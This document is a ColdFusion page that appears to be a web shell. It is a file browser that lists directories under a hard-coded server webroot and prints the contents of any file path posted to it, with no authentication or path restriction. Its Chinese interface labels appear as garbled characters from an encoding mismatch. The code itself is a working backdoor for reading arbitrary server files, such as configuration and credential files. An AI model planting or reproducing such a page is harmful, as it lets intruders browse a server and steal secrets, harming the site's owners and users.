<CFPARAM NAME="Form.path" DEFAULT="D:\INETPUB\DRS.COM\WWWROOT\">
<CFPARAM NAME="Form.filepath" DEFAULT=".">

<CFIF #Form.filepath# IS NOT ".">
<CFFILE ACTION="Read" FILE="#Form.filepath#" VARIABLE="Message">
<CFOUTPUT>#htmlCodeFormat(Message)#</CFOUTPUT>
<CFABORT>
</CFIF>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>��������</title>
<STYLE type="text/css">
body,td {FONT-SIZE: 12px;}
a {COLOR: 0000FF; TEXT-DECORATION: none}
</STYLE>

<script language="javascript">
<!--
  function yesok(){
    if (confirm("ȷ��Ҫִ�д˲�����"))
		return true;
	else
		return false;
    }

  function ShowFolder(Folder){
	FolderPath.path.value += Folder + "\\";
	FolderPath.submit();
    }
  function ShowFile(File){
	hideform.filepath.value = FolderPath.path.value + File;
	hideform.submit();
    }
-->
</script>
</head>
<body>

<TABLE cellSpacing=1 cellPadding=0 width="100%" border=0 BGCOLOR="CCCCCC">
<form action="" name="FolderPath" method="post">
	<TR>
		<TD>
		��ʾĿ¼�ľ���·����
		<CFOUTPUT>
		<input name="path" value="#Form.path#" style="width:600">
		</CFOUTPUT>
		<input type=submit value="��ʾ">
		</TD>
	</TR>
</form>
</TABLE>

<CFDIRECTORY DIRECTORY="#Form.path#" NAME="mydirectory" SORT="size ASC, name DESC, datelastmodified">

<TABLE cellSpacing=1 cellPadding=0 width="100%" border=0 BGCOLOR="CCCCCC">
	<TR BGCOLOR="CCCCCC">
		<TD height=25>Ŀ¼/�ļ�</TD>
		<TD>�޸�ʱ��</TD>
		<TD>��С</TD>
		<TD>����</TD>
	</TR>

<CFOUTPUT QUERY="mydirectory">

<CFIF #mydirectory.type# IS "Dir">
	<TR BGCOLOR="EFEFEF">
		<TD><a href="javascript:ShowFolder('#mydirectory.name#')">#mydirectory.name#</a></TD>
<CFELSE>
	<TR BGCOLOR="FFFFFF">
		<TD><a href="javascript:ShowFile('#mydirectory.name#')">#mydirectory.name#</a></TD>
</CFIF>
		<TD>#mydirectory.datelastmodified#</TD>
		<TD>#mydirectory.size#</TD>
		<TD>#mydirectory.attributes#</TD>
	</TR>
</CFOUTPUT>

</TABLE>

<Form name="hideform" method="post" action="" target="_blank">
	<input type="hidden" name="filepath">
</Form>


</body>
</html>